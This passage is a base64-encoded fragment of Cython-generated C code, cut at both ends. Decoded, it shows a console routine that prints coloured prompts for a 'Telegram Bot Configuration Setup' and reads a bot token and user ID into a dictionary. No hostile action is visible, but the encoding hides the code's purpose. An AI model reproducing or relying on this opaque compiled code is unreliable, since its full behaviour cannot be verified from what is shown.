3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgOTQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JFU0VUKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDk0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDk0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gIF9fcHl4X3RfMTJbMF0gPSBfX3B5eF90XzU7XG4gIF9fcHl4X3RfMTJbMV0gPSBfX3B5eF90XzExO1xuICBfX3B5eF90XzEyWzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9URUxFR1JBTV9CT1RfQ09ORklHVVJBVElPTl9TRVRVO1xuICBfX3B5eF90XzEyWzNdID0gX19weXhfdF85O1xuICBfX3B5eF90XzEwID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF8xMiwgNCwgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF81KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTEpICsgMzYgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzkpLCAxMTE0MTExIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF85KSk7XG4gIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA5NCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICBfX3B5eF90XzYgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgX19weXhfdF8xMH07XG4gICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDk0LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8yID0gTlVMTDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpO1xuICBfX3B5eF90XzEwID0gX19weXhfYnVpbHRpbl9wcmludDsgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfTUFHRU5UQSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDk1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCA5NSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgX19weXhfdF80ID0gX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UoX19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yNSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDk1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICBfX3B5eF90XzYgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfdF80fTtcbiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDk1LCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTtcbiAgfVxuICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcblxuICBcbiAgX19weXhfdF8xMCA9IE5VTEw7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX2lucHV0KTtcbiAgX19weXhfdF80ID0gX19weXhfYnVpbHRpbl9pbnB1dDsgXG5cbiAgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQk9MRCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCA5OCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9XSElURSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HUkVFTik7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA5OCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9XSElURSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEzKSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTMpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRVNFVCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfMTQgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDk4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTQpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgX19weXhfdF8xNVswXSA9IF9fcHl4X3RfOTtcbiAgX19weXhfdF8xNVsxXSA9IF9fcHl4X3RfMTE7XG4gIF9fcHl4X3RfMTVbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0VudGVyX3lvdXJfVGVsZWdyYW07XG4gIF9fcHl4X3RfMTVbM10gPSBfX3B5eF90XzU7XG4gIF9fcHl4X3RfMTVbNF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0JvdF9Ub2tlbjtcbiAgX19weXhfdF8xNVs1XSA9IF9fcHl4X3RfMTM7XG4gIF9fcHl4X3RfMTVbNl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18yNjtcbiAgX19weXhfdF8xNVs3XSA9IF9fcHl4X3RfMTQ7XG4gIF9fcHl4X3RfMiA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMTUsIDgsIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfOSkgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzExKSArIDIyICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF81KSArIDkgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzEzKSArIDIgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzE0KSwgMTExNDExMSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzkpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTEpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMykgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xNCkpO1xuICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA5OCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7XG4gIF9fcHl4X3RfNiA9IDE7XG4gIHtcbiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgX19weXhfdF8yfTtcbiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOTcsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICB9XG4gIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVG9rZW4sIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA5NywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzQgPSBOVUxMO1xuICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7XG4gIF9fcHl4X3RfMiA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IFxuICBfX3B5eF90XzYgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgTlVMTH07XG4gICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgxLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA5OSwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIH1cbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgXG4gIF9fcHl4X3RfMiA9IE5VTEw7XG4gIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX2lucHV0KTtcbiAgX19weXhfdF80ID0gX19weXhfYnVpbHRpbl9pbnB1dDsgXG5cbiAgXG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0JPTEQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICBfX3B5eF90XzE0ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMTAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTQpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9XSElURSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxMDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMykpIF9fUFlYX0VSUigwLCAxMDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMyk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1lFTExPVyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAxMDEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1dISVRFKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDEwMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDEwMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVTRVQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMTAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDEwMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICBfX3B5eF90XzE1WzBdID0gX19weXhfdF8xNDtcbiAgX19weXhfdF8xNVsxXSA9IF9fcHl4X3RfMTM7XG4gIF9fcHl4X3RfMTVbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0VudGVyX3lvdXJfVGVsZWdyYW07XG4gIF9fcHl4X3RfMTVbM10gPSBfX3B5eF90XzU7XG4gIF9fcHl4X3RfMTVbNF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1VzZXJfSUQ7XG4gIF9fcHl4X3RfMTVbNV0gPSBfX3B5eF90XzExO1xuICBfX3B5eF90XzE1WzZdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMjY7XG4gIF9fcHl4X3RfMTVbN10gPSBfX3B5eF90Xzk7XG4gIF9fcHl4X3RfMTAgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzE1LCA4LCBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzE0KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTMpICsgMjIgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzUpICsgNyArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTEpICsgMiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfOSksIDExMTQxMTEgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xNCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMykgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF81KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzExKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzkpKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDEwMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICBfX3B5eF90XzYgPSAxO1xuICB7XG4gICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfdF8xMH07XG4gICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDEwMCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gIH1cbiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JRCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEwMCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuXG4gIFxuICBfX3B5eF90XzQgPSBOVUxMO1xuICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7XG4gIF9fcHl4X3RfMTAgPSBfX3B5eF9idWlsdGluX3ByaW50OyBcbiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9NQUdFTlRBKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTAzLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAxMDMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTtcbiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gIF9fcHl4X3RfMTZbMF0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X184O1xuICBfX3B5eF90XzE2WzFdID0gX19weXhfdF85O1xuICBfX3B5eF90Xz